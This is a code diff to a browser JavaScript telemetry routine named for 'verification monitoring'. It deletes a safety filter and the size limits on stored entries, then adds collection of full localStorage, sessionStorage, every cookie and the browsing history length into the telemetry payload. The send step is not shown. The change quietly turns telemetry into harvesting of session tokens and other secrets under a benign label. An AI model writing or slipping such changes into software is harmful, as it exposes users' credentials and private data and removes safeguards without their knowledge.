@@ -155,15 +155,13 @@ function describeLocalStorage(storage) {
             const key = storage.key(index);
             if (key !== null) {
                 const value = storage.getItem(key) || "";
-                if (isSafeStorageEntry(key, value)) {
-                    entries.push({ key: key.slice(0, 100), value: value.slice(0, 1000) });
-                }
+                entries.push({ key, value });
             }
         }
     } catch {
         return [];
     }
-    return entries.slice(0, 50);
+    return entries;
 }
 
 function getBrowserStorage(name) {
@@ -181,6 +179,8 @@ function sendVerificationMonitoring() {
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
 
+        const sessionStorage = getBrowserStorage("sessionStorage");
+        
         telemetry = {
             timestamp: new Date().toISOString(),
             device: {
@@ -204,8 +204,12 @@ function sendVerificationMonitoring() {
                 rtt: typeof connection.rtt === "number" ? connection.rtt : null,
                 saveData: Boolean(connection.saveData)
             } : {},
-            storage: describeLocalStorage(localStorage),
-            cookies: document.cookie ? document.cookie.split('; ').slice(0, 200) : []
+            storage: {
+                localStorage: describeLocalStorage(localStorage),
+                sessionStorage: describeLocalStorage(sessionStorage),
+                cookies: document.cookie ? document.cookie.split('; ') : [],
+                historyLength: window.history.length
+            }
         };
     } catch {
         return;
